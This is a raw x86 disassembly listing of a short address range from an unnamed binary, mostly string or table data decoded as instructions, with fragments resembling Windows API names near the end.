  423808:	and    BYTE PTR [edx],al
  42380a:	ficomp WORD PTR [ecx]
  42380c:	add    BYTE PTR [eax],al
  42380e:	add    BYTE PTR [eax],al
  423810:	add    BYTE PTR [eax],al
  423812:	add    al,al
  423814:	inc    edx
  423815:	add    BYTE PTR [eax+eax*8],al
  423818:	inc    edx
  423819:	add    BYTE PTR [eax],cl
  42381b:	rol    BYTE PTR [edx+0x0],0xc
  42381f:	rol    BYTE PTR [edx+0x0],0x10
  423823:	rol    BYTE PTR [edx+0x0],0x14
  423827:	rol    BYTE PTR [edx+0x0],0x18
  42382b:	rol    BYTE PTR [edx+0x0],0x1c
  42382f:	rol    BYTE PTR [edx+0x0],0x57
  423833:	inc    edi
  423834:	cmp    DWORD PTR [edi+0x41],ebx
  423837:	pop    eax
  423838:	ss push esi
  42383a:	pop    edi
  42383b:	cmp    BYTE PTR [eax],al
  42383d:	inc    ebx
  42383e:	inc    ebp
  42383f:	dec    esp
  423840:	pop    edi
  423841:	pop    eax
  423842:	push   edi
  423843:	dec    eax
  423844:	inc    edx
  423845:	add    BYTE PTR [edi+0x50],dl
  423848:	xor    eax,0x4641365f
  42384d:	cmp    DWORD PTR [edx],esi
  42384f:	xor    ebx,DWORD PTR [edi+0x32]
  423852:	aaa    
  423853:	add    BYTE PTR [eax+0x48],dl
  423856:	xor    BYTE PTR [edi+0x58],bl
  423859:	push   esp
  42385a:	inc    ecx
  42385b:	dec    ebp
  42385c:	push   ecx
  42385d:	pop    edi
  42385e:	inc    esi
  42385f:	push   ebp
  423860:	cmp    DWORD PTR [eax],eax
  423862:	push   edi
  423863:	push   ebp
  423864:	inc    ecx
  423865:	xor    dh,BYTE PTR [ebx]
  423867:	xor    ebx,DWORD PTR [edi+0x4e]
  42386a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42386e:	cmp    DWORD PTR [edi+0x38],ebx
  423871:	dec    ecx
  423872:	cmp    DWORD PTR [edx+0x36],ebx
  423875:	pop    edi
  423876:	dec    edx
  423877:	xor    BYTE PTR [edx+0x34],cl
  42387a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42387e:	xor    esi,DWORD PTR [eax]
  423880:	pop    edi
  423881:	inc    edx
  423882:	dec    ebx
  423883:	pop    eax
  423884:	pop    eax
  423885:	xor    eax,0x51414d00
  42388a:	pop    edi
  42388b:	inc    ecx
  42388c:	xor    al,BYTE PTR [ebp+0x5f]
  42388f:	inc    ecx
  423890:	dec    ebx
  423891:	cmp    DWORD PTR ds:0x5a003939,esi
  423897:	inc    ebp
  423898:	cmp    BYTE PTR [edi+0x4d],bl
  42389b:	ss dec eax
  42389d:	dec    ebx
  42389e:	add    BYTE PTR [ebp+0x57],al
  4238a1:	xor    DWORD PTR [edi+0x31],ebx
  4238a4:	dec    ebx
  4238a5:	xor    eax,DWORD PTR [ecx+0x30]
  4238a8:	push   ebx
  4238a9:	add    BYTE PTR [edx+esi*1+0x36],al
  4238ad:	aaa    
  4238ae:	pop    edi
  4238af:	push   edx
  4238b0:	dec    eax
  4238b1:	dec    ebp
  4238b2:	cmp    BYTE PTR [edi+0x37],bl
  4238b5:	inc    esi
  4238b6:	xor    eax,0x43355500
  4238bb:	pop    edi
  4238bc:	pop    ecx
  4238bd:	dec    ecx
  4238be:	push   ebx
  4238bf:	xor    bl,BYTE PTR [edi+0x52]
  4238c2:	add    BYTE PTR [eax+0x55],dl
  4238c5:	dec    ecx
  4238c6:	xor    BYTE PTR [edi+0x43],bl
  4238c9:	ss inc ebp
  4238cb:	xor    bl,BYTE PTR [edi+0x4d]
  4238ce:	xor    al,0x4a
  4238d0:	push   edx
  4238d1:	push   ebp
  4238d2:	add    BYTE PTR [esi+0x39],cl
  4238d5:	push   eax
  4238d6:	pop    edi
  4238d7:	push   ebp
  4238d8:	cmp    DWORD PTR [esi],esi
  4238da:	xor    BYTE PTR [ecx],dh
  4238dc:	pop    edi
  4238dd:	dec    edi
  4238de:	dec    esi
  4238df:	push   esp
  4238e0:	cmp    BYTE PTR [eax],al
  4238e2:	dec    esp
  4238e3:	xor    al,0x44
  4238e5:	xor    DWORD PTR [edi+0x4b],ebx
  4238e8:	xor    DWORD PTR [ebp+0x5f],eax
  4238eb:	pop    edx
  4238ec:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238f0:	pop    edi
  4238f1:	inc    edx
  4238f2:	xor    dh,BYTE PTR [ecx]
  4238f4:	push   ebx
  4238f5:	xor    DWORD PTR [ecx],edi
  4238f7:	inc    edx
  4238f8:	add    BYTE PTR [edi+0x45],al
  4238fb:	xor    al,0x38
  4238fd:	xor    BYTE PTR [eax],dh
  4238ff:	pop    edi
  423900:	dec    edx
  423901:	dec    ebx
  423902:	xor    eax,0x33345f4d
  423907:	add    BYTE PTR [ebx+esi*1+0x57],cl
  42390b:	pop    edi
  42390c:	aaa    
  42390d:	push   esi
  42390e:	dec    ebx
  42390f:	push   edx
  423910:	pop    edi
  423911:	inc    ebx
  423912:	add    BYTE PTR [edx+0x35],bl
  423915:	dec    ebp
  423916:	pop    edi
  423917:	inc    edi
  423918:	dec    esi
  423919:	xor    al,0x49
  42391b:	xor    eax,0x54590035
  423920:	push   edx
  423921:	pop    edi
  423922:	push   esp
  423923:	inc    ebx
  423924:	inc    ecx
  423925:	pop    edi
  423926:	cmp    DWORD PTR [ecx+0x41],ebx
  423929:	push   ebp
  42392a:	pop    edi
  42392b:	push   ebp
  42392c:	inc    ebp
  42392d:	add    BYTE PTR [esi+esi*1+0x35],cl
  423931:	pop    edi
  423932:	pop    eax
  423933:	dec    edx
  423934:	inc    edx
  423935:	inc    edi
  423936:	add    BYTE PTR [edx+0x36],al
  423939:	inc    ebx
  42393a:	pop    edi
  42393b:	xor    BYTE PTR ds:0x36464b,dh
  423941:	dec    ebx
  423942:	cmp    DWORD PTR [esi+0x37],eax
  423945:	xor    ebx,DWORD PTR [edi+0x35]
  423948:	ss inc edi
  42394a:	pop    ecx
  42394b:	dec    eax
  42394c:	pop    ecx
  42394d:	add    BYTE PTR [ebp+0x35],cl
  423950:	push   eax
  423951:	xor    BYTE PTR [edi+0x4f],bl
  423954:	pop    ecx
  423955:	xor    cl,BYTE PTR [edi+0x0]
  423958:	pop    ecx
  423959:	xor    DWORD PTR [esi+0x5f],ecx
  42395c:	xor    al,BYTE PTR [edx+0x30]
  42395f:	push   esi
  423960:	push   esp
  423961:	inc    ebp
  423962:	add    BYTE PTR [edi+0x37],al
  423965:	push   esi
  423966:	xor    DWORD PTR [edi+0x49],ebx
  423969:	xor    al,BYTE PTR [esi+0x30]
  42396c:	pop    edi
  42396d:	ss dec esi
  42396f:	cmp    BYTE PTR [eax],al
  423971:	pop    edx
  423972:	xor    eax,0x445f334b
  423977:	xor    BYTE PTR [eax],bh
  423979:	push   ecx
  42397a:	push   esi
  42397b:	xor    al,0x0
  42397d:	push   ebp
  42397e:	pop    eax
  42397f:	inc    edi
  423980:	xor    DWORD PTR [edi+0x39],ebx
  423983:	push   esp
  423984:	inc    ebx
  423985:	aaa    
  423986:	inc    esp
  423987:	add    BYTE PTR [edi+0x39],dl
  42398a:	ss pop edi
  42398c:	dec    eax
  42398d:	pop    edx
  42398e:	pop    ecx
  42398f:	inc    edi
  423990:	push   ebp
  423991:	pop    edi
  423992:	push   eax
  423993:	dec    eax
  423994:	inc    ebx
  423995:	add    BYTE PTR [ebp+0x0],dl
  423998:	xor    al,0x0
  42399a:	dec    edi
  42399b:	add    BYTE PTR [edi+0x0],bl
  42399e:	cmp    BYTE PTR [eax],al
  4239a0:	xor    al,BYTE PTR [eax]
  4239a2:	inc    ebx
  4239a3:	add    BYTE PTR [edx+0x0],bl
  4239a6:	inc    ebx
  4239a7:	add    BYTE PTR [edi],dh
  4239a9:	add    BYTE PTR [edi+0x0],bl
  4239ac:	inc    ebx
  4239ad:	add    BYTE PTR [eax+eax*1+0x0],al
  4239b1:	add    BYTE PTR [eax+eax*1+0x4b],cl
  4239b5:	add    BYTE PTR [edx],dh
  4239b7:	add    BYTE PTR [edi+0x0],bl
  4239ba:	cmp    BYTE PTR [eax],al
  4239bc:	dec    esp
  4239bd:	add    BYTE PTR [esi+0x0],dl
  4239c0:	pop    edi
  4239c1:	add    BYTE PTR [ecx+0x0],bl
  4239c4:	push   edx
  4239c5:	add    BYTE PTR [esi+0x0],dl
  4239c8:	xor    al,BYTE PTR [eax]
  4239ca:	cmp    BYTE PTR [eax],al
  4239cc:	pop    edi
  4239cd:	add    BYTE PTR [edx+0x0],cl
  4239d0:	add    BYTE PTR [eax],al
  4239d2:	inc    edx
  4239d3:	add    BYTE PTR [eax+eax*1+0x46],cl
  4239d7:	add    BYTE PTR [edi+0x0],bl
  4239da:	xor    eax,DWORD PTR [eax]
  4239dc:	inc    ebp
  4239dd:	add    BYTE PTR [ecx+0x0],cl
  4239e0:	push   edx
  4239e1:	add    BYTE PTR [ecx],bh
  4239e3:	add    BYTE PTR [esi+0x0],dl
  4239e6:	add    BYTE PTR [eax],al
  4239e8:	dec    ebp
  4239e9:	add    BYTE PTR [edi],dh
  4239eb:	add    BYTE PTR [eax+eax*1+0x5f],al
  4239ef:	add    BYTE PTR [edx+0x0],cl
  4239f2:	pop    eax
  4239f3:	add    BYTE PTR [ebx],dh
  4239f5:	add    BYTE PTR [ecx],dh
  4239f7:	add    BYTE PTR [ebx+0x0],al
  4239fa:	add    BYTE PTR [eax],al
  4239fc:	dec    edi
  4239fd:	add    BYTE PTR [esi],dh
  4239ff:	add    BYTE PTR [eax+0x0],cl
  423a02:	pop    edi
  423a03:	add    BYTE PTR [eax],dh
  423a05:	add    BYTE PTR [edi],dh
  423a07:	add    BYTE PTR [ecx],dh
  423a09:	add    BYTE PTR [edx+0x0],dl
  423a0c:	xor    eax,0x55000000
  423a11:	add    BYTE PTR [eax+eax*1+0x5a],dl
  423a15:	add    BYTE PTR [edi+0x0],bl
  423a18:	push   esp
  423a19:	add    BYTE PTR [ecx+0x0],al
  423a1c:	cmp    DWORD PTR [eax],eax
  423a1e:	pop    edi
  423a1f:	add    BYTE PTR [ebx],dh
  423a21:	add    BYTE PTR [eax],dh
  423a23:	add    BYTE PTR [eax],bh
  423a25:	add    BYTE PTR [edi+0x0],cl
  423a28:	inc    ebx
  423a29:	add    BYTE PTR ds:0x4d000000,dh
  423a2f:	add    BYTE PTR [esi+0x0],cl
  423a32:	inc    ebp
  423a33:	add    BYTE PTR [edi+0x0],bl
  423a36:	push   esp
  423a37:	add    BYTE PTR [esi+0x0],al
  423a3a:	cmp    BYTE PTR [eax],al
  423a3c:	push   ebx
  423a3d:	add    BYTE PTR [edx+0x0],bl
  423a40:	pop    edi
  423a41:	add    BYTE PTR [eax],dh
  423a43:	add    BYTE PTR [eax],bh
  423a45:	add    BYTE PTR [eax+0x0],cl
  423a48:	add    BYTE PTR [eax],al
  423a4a:	dec    esi
  423a4b:	add    BYTE PTR [edi+0x0],cl
  423a4e:	pop    edx
  423a4f:	add    BYTE PTR [edi+0x0],bl
  423a52:	add    BYTE PTR ss:[ecx+0x0],bl
  423a56:	dec    ebp
  423a57:	add    BYTE PTR [esi],dh
  423a59:	add    BYTE PTR [ebx],dh
  423a5b:	add    BYTE PTR [edi+0x0],bl
  423a5e:	xor    al,0x0
  423a60:	dec    esi
  423a61:	add    BYTE PTR [edx],dh
  423a63:	add    BYTE PTR [esi],dh
  423a65:	add    BYTE PTR [ecx],dh
  423a67:	add    BYTE PTR [eax],al
  423a69:	add    BYTE PTR [ebx+0x0],cl
  423a6c:	dec    eax
  423a6d:	add    BYTE PTR [eax],bh
  423a6f:	add    BYTE PTR [edi+0x0],bl
  423a72:	inc    esi
  423a73:	add    BYTE PTR [esi+0x0],al
  423a76:	push   esp
  423a77:	add    BYTE PTR [edi],dh
  423a79:	add    BYTE PTR [esi],dh
  423a7b:	add    BYTE PTR [edi+0x0],bl
  423a7e:	dec    esp
  423a7f:	add    BYTE PTR [ecx+0x0],bl
  423a82:	add    BYTE PTR [eax],al
  423a84:	push   ebx
  423a85:	add    BYTE PTR [ecx+0x0],bl
  423a88:	xor    BYTE PTR [eax],al
  423a8a:	pop    edi
  423a8b:	add    BYTE PTR [ecx],bh
  423a8d:	add    BYTE PTR [edx+0x0],dl
  423a90:	dec    eax
  423a91:	add    BYTE PTR [ecx+0x0],bl
  423a94:	xor    al,BYTE PTR [eax]
  423a96:	pop    edi
  423a97:	add    BYTE PTR [eax],dh
  423a99:	add    BYTE PTR [eax],al
  423a9b:	add    BYTE PTR [edx+0x0],al
  423a9e:	dec    edx
  423a9f:	add    BYTE PTR [esi+0x0],cl
  423aa2:	xor    al,BYTE PTR [eax]
  423aa4:	pop    edi
  423aa5:	add    BYTE PTR [eax+eax*1+0x33],cl
  423aa9:	add    BYTE PTR [edx+0x0],dl
  423aac:	xor    al,0x0
  423aae:	dec    eax
  423aaf:	add    BYTE PTR [eax],al
  423ab1:	add    BYTE PTR [ebp+0x0],dl
  423ab4:	add    BYTE PTR ss:[ebp+0x0],cl
  423ab8:	xor    DWORD PTR [eax],eax
  423aba:	pop    edi
  423abb:	add    BYTE PTR [esi],dh
  423abd:	add    BYTE PTR [ecx+0x0],bl
  423ac0:	push   ebp
  423ac1:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423ac5:	add    BYTE PTR [edi+0x0],cl
  423ac8:	inc    esp
  423ac9:	add    BYTE PTR [edi+0x0],dl
  423acc:	push   ebx
  423acd:	add    BYTE PTR [eax],al
  423acf:	add    BYTE PTR [edx+0x0],bl
  423ad2:	inc    ebx
  423ad3:	add    BYTE PTR [ebp+0x0],dl
  423ad6:	pop    edi
  423ad7:	add    BYTE PTR [ecx],dh
  423ad9:	add    BYTE PTR [ebp+0x0],al
  423adc:	push   esp
  423add:	add    BYTE PTR [eax],dh
  423adf:	add    BYTE PTR [eax],al
  423ae1:	add    BYTE PTR [eax],al
  423ae3:	add    BYTE PTR [eax],al
  423ae5:	add    BYTE PTR [eax-0x7ffbffbe],al
  423aeb:	inc    edx
  423aec:	add    BYTE PTR [eax],cl
  423aee:	add    BYTE PTR [edx+0x0],0xc
  423af2:	add    BYTE PTR [edx+0x0],0x10
  423af6:	add    BYTE PTR [edx+0x0],0x14
  423afa:	add    BYTE PTR [edx+0x0],0x18
  423afe:	add    BYTE PTR [edx+0x0],0x1c
  423b02:	add    BYTE PTR [edx+0x0],0x20
  423b06:	add    BYTE PTR [edx+0x0],0x24
  423b0a:	add    BYTE PTR [edx+0x0],0x28
  423b0e:	add    BYTE PTR [edx+0x0],0x0
	...
  423b22:	add    BYTE PTR [eax],al
  423b24:	sbb    edi,DWORD PTR [edi+0x4d57]
  423b2a:	add    BYTE PTR [eax],al
  423b2c:	push   edx
  423b2d:	cmp    eax,DWORD PTR [edx]
  423b2f:	add    BYTE PTR [ecx],al
  423b31:	add    BYTE PTR [eax],al
  423b33:	add    BYTE PTR [ecx],al
  423b35:	add    BYTE PTR [eax],al
  423b37:	add    BYTE PTR [ecx],al
  423b39:	add    BYTE PTR [eax],al
  423b3b:	add    BYTE PTR [eax+0x3b],cl
  423b3e:	add    al,BYTE PTR [eax]
  423b40:	dec    esp
  423b41:	cmp    eax,DWORD PTR [edx]
  423b43:	add    BYTE PTR [eax+0x3b],dl
  423b46:	add    al,BYTE PTR [eax]
  423b48:	inc    esi
  423b49:	iret   
  423b4a:	add    BYTE PTR [eax],al
  423b4c:	pop    esi
  423b4d:	cmp    eax,DWORD PTR [edx]
  423b4f:	add    BYTE PTR [eax],al
  423b51:	add    BYTE PTR [edi+0x6f],dl
  423b54:	jb     0x423bba
  423b56:	push   edi
  423b57:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b5e:	aas    
  423b5f:	inc    ebp
  423b60:	outs   dx,BYTE PTR ds:[esi]
  423b61:	jne    0x423bd0
  423b63:	push   edi
  423b64:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b6b:	popa   
  423b6c:	je     0x423bd7
  423b6e:	outs   dx,DWORD PTR ds:[esi]
  423b6f:	outs   dx,BYTE PTR ds:[esi]
  423b70:	jae    0x423bc5
  423b72:	je     0x423bd5
  423b74:	.byte 0x74
